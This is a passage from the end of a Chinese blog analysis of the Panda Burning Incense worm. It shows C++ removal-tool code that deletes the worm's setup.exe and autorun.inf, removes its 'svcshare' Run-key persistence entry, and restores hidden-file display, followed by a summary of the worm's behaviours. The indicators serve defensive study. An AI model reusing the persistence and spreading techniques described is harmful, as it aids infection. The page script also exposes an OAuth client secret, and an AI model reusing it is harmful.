&#123;  </span><br><span class="line">        <span class="keyword">char</span> szAutorunPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;    </span><br><span class="line">        <span class="keyword">char</span> szSetupPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        lstrcat(szAutorunPath,pTmp);</span><br><span class="line">        lstrcat(szAutorunPath,<span class="string">"autorun.inf"</span>);</span><br><span class="line">        lstrcat(szSetupPath,pTmp);</span><br><span class="line">        lstrcat(szSetupPath,<span class="string">"setup.exe"</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (GetFileAttributes(szSetupPath) == <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += pTmp;</span><br><span class="line">            csTxt += _T(<span class="string">"setup.exe病毒文件不存在\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += pTmp;</span><br><span class="line">            csTxt += _T(<span class="string">"setup.exe病毒文件存在，正在进行计算校验和...\r\n"</span>);</span><br><span class="line">            HANDLE hFile = CreateFile(szSetupPath,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">            &#123;</span><br><span class="line">                AfxMessageBox(<span class="string">"Create Error"</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            DWORD dwSize = GetFileSize(hFile,<span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (dwSize == <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                AfxMessageBox(<span class="string">"GetFileSize Error"</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">            BYTE *pFile = (BYTE*)<span class="built_in">malloc</span>(dwSize);</span><br><span class="line">            <span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                AfxMessageBox(<span class="string">"malloc Error"</span>);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125;         </span><br><span class="line">           </span><br><span class="line">            DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">            ReadFile(hFile,pFile,dwSize,&amp;dwNum,<span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">            DWORD dwCrc32 = CRC32(pFile,dwSize);   </span><br><span class="line">            <span class="keyword">if</span> (pFile != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">free</span>(pFile);</span><br><span class="line">                pFile = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            CloseHandle(hFile);</span><br><span class="line">            <span class="keyword">if</span> (dwCrc32 != <span class="number">0x89240FCD</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"校验和验证失败\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"校验和验证成功，正在删除...\r\n"</span>); </span><br><span class="line">                <span class="comment">// 去除文件的隐藏、系统以及只读属性</span></span><br><span class="line">                DWORD dwFileAttributes = GetFileAttributes(szSetupPath);</span><br><span class="line">                dwFileAttributes &amp;= ~FILE_ATTRIBUTE_HIDDEN;</span><br><span class="line">                dwFileAttributes &amp;= ~FILE_ATTRIBUTE_SYSTEM;</span><br><span class="line">                dwFileAttributes &amp;= ~FILE_ATTRIBUTE_READONLY;</span><br><span class="line">                SetFileAttributes(szSetupPath, dwFileAttributes);</span><br><span class="line">                <span class="comment">// 删除setup.exe</span></span><br><span class="line">                bRet = DeleteFile(szSetupPath);	</span><br><span class="line">                <span class="keyword">if</span> (bRet)</span><br><span class="line">                &#123;</span><br><span class="line">                    csTxt += pTmp;</span><br><span class="line">                    csTxt += _T(<span class="string">"setup.exe病毒被删除!\r\n"</span>);</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    csTxt += pTmp;</span><br><span class="line">                    csTxt += _T(<span class="string">"setup.exe病毒无法删除\r\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 去除文件的隐藏、系统以及只读属性</span></span><br><span class="line">        DWORD dwFileAttributes = GetFileAttributes(szAutorunPath);</span><br><span class="line">        dwFileAttributes &amp;= ~FILE_ATTRIBUTE_HIDDEN;</span><br><span class="line">        dwFileAttributes &amp;= ~FILE_ATTRIBUTE_SYSTEM;</span><br><span class="line">        dwFileAttributes &amp;= ~FILE_ATTRIBUTE_READONLY;</span><br><span class="line">        SetFileAttributes(szAutorunPath, dwFileAttributes);</span><br><span class="line">        <span class="comment">// 删除autorun.inf</span></span><br><span class="line">        bRet = DeleteFile(szAutorunPath);	</span><br><span class="line">        csTxt += pTmp;</span><br><span class="line">        <span class="keyword">if</span> (bRet)</span><br><span class="line">        &#123;         </span><br><span class="line">            csTxt += _T(<span class="string">"autorun.inf被删除!\r\n"</span>);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"autorun.inf不存在或无法删除\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 删除Desktop_.ini</span></span><br><span class="line">        FindFiles(pTmp);</span><br><span class="line">        <span class="comment">// 检查下一个盘符</span></span><br><span class="line">        pTmp += <span class="number">4</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    Sleep(<span class="number">10</span>);</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//  修复注册表内容，删除病毒启动项并修复文件的隐藏显示</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line">    csTxt += _T(<span class="string">"正在检查注册表...\r\n"</span>);</span><br><span class="line">    SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">    <span class="comment">// 首先检查启动项</span></span><br><span class="line">    <span class="keyword">char</span> RegRun[] = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;   </span><br><span class="line">    HKEY hKeyHKCU = <span class="literal">NULL</span>;    </span><br><span class="line">    LONG lSize = MAXBYTE;</span><br><span class="line">    <span class="keyword">char</span> cData[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">long</span> lRet = RegOpenKey(HKEY_CURRENT_USER, RegRun, &amp;hKeyHKCU);</span><br><span class="line">    <span class="keyword">if</span>(lRet == ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        lRet = RegQueryValueEx(hKeyHKCU,<span class="string">"svcshare"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)cData,(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;lSize);</span><br><span class="line">        <span class="keyword">if</span> ( lRet == ERROR_SUCCESS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (lstrcmp(cData,<span class="string">"C:\\WINDOWS\\system32\\drivers\\spoclsv.exe"</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"注册表启动项中存在病毒信息\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            lRet = RegDeleteValue(hKeyHKCU,<span class="string">"svcshare"</span>);</span><br><span class="line">            <span class="keyword">if</span> (lRet == ERROR_SUCCESS)</span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"注册表启动项中的病毒信息已删除！\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"注册表启动项中的病毒信息无法删除\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"注册表启动项中不存在病毒信息\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        RegCloseKey(hKeyHKCU);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"注册表启动项信息读取失败\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 接下来修复文件的隐藏显示，需要将CheckedValue的值设置为1</span></span><br><span class="line">    <span class="keyword">char</span> RegHide[] = <span class="string">"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL"</span>; </span><br><span class="line">    HKEY hKeyHKLM = <span class="literal">NULL</span>; </span><br><span class="line">    DWORD dwFlag = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">long</span> lRetHide = RegOpenKey(HKEY_LOCAL_MACHINE, RegHide, &amp;hKeyHKLM);</span><br><span class="line">    <span class="keyword">if</span>(lRetHide == ERROR_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"检测注册表的文件隐藏选项...\r\n"</span>);</span><br><span class="line">        <span class="keyword">if</span>( ERROR_SUCCESS == RegSetValueEx(</span><br><span class="line">			    hKeyHKLM,             <span class="comment">//subkey handle  </span></span><br><span class="line">                            <span class="string">"CheckedValue"</span>,       <span class="comment">//value name  </span></span><br><span class="line">                            <span class="number">0</span>,                    <span class="comment">//must be zero  </span></span><br><span class="line">                            REG_DWORD,            <span class="comment">//value type  </span></span><br><span class="line">                            (CONST BYTE*)&amp;dwFlag, <span class="comment">//pointer to value data  </span></span><br><span class="line">                            <span class="number">4</span>))                   <span class="comment">//length of value data</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"注册表修复完毕！\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"无法恢复注册表的文件隐藏选项\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">// 病毒查杀完成</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line">    csTxt += _T(<span class="string">"病毒查杀完成，请使用专业杀毒软件进行全面扫描！\r\n"</span>);</span><br><span class="line">    SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="5．总结"><a href="#5．总结" class="headerlink" title="5．总结"></a>5．总结</h1><p>熊猫烧香是一种蠕虫病毒，使用Delphi语言编写，本身有FSG壳，这里的程序已经被脱壳。病毒本身具有自我复制，本地感染，局域网感染，感染本地成程序和网页代码，并且会根据系统进程和根目录程序是否存在进行自我复制，会进行关闭服务，删除系统备份，自启动，修改注册表，关闭杀毒软件，等行为，所以在当年传播范围广，杀毒毕竟困难的特点。</p>
<h1 id="6．参考资料"><a href="#6．参考资料" class="headerlink" title="6．参考资料"></a>6．参考资料</h1><p>【1】 姜烨博客 <a href="https://blog.csdn.net/ioio_jy/article/details/40961557" target="_blank" rel="noopener">https://blog.csdn.net/ioio_jy/article/details/40961557</a><br>【2】 看雪黑手鱼发帖 <a href="https://bbs.pediy.com/thread-217802.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-217802.htm</a><br>【3】 《C++反汇编与逆向分析技术揭秘》 钱林松,赵海旭著    </p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">yangruiqi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/07/16/熊猫烧香病毒分析报告/">http://yoursite.com/2018/07/16/熊猫烧香病毒分析报告/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com" target="_blank">manyouyou</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/病毒分析/">病毒分析</a><a class="post-meta__tags" href="/tags/熊猫烧香/">熊猫烧香</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/收款码/zhifubao.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="https://raw.githubusercontent.com/yangruiqiyr/MarkdownPhotos/master/收款码/weixin.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/07/28/CVE-2012-0158-漏洞分析/"><i class="fa fa-chevron-left">  </i><span>CVE-2012-0158 漏洞分析</span></a></div><div class="next-post pull-right"><a href="/2018/07/09/APC异步过程调用/"><span>APC异步过程调用</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitment-container"></div><script>var gitment = new Gitment({
  owner: 'yangruiqiyr',
  repo: 'BlogGitment',
  oauth: {
    client_id: 'dfbfacd2fb59427cee9e',
    client_secret: 'a39b872c7d6ddf551a16ebf9a3d59ce9b57508bb'
  }
})
gitment.render('gitment-container')</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2015 - 2018 By yangruiqi</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Hi, welcome to my <a href="www.yangruiqiyr.com">blog</a>!</div><div class="busuanzi"><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.5"></script><script src="/js/fancybox.js?version=1.5.5"></script><script src="/js/sidebar.js?version=1.5.5"></script><script src="/js/copy.js?version=1.5.5"></script><script src="/js/fireworks.js?version=1.5.5"></script><script src="/js/transition.js?version=1.5.5"></script><script src="/js/scroll.js?version=1.5.5"></script><script src="/js/head.js?version=1.5.5"></script></body></html>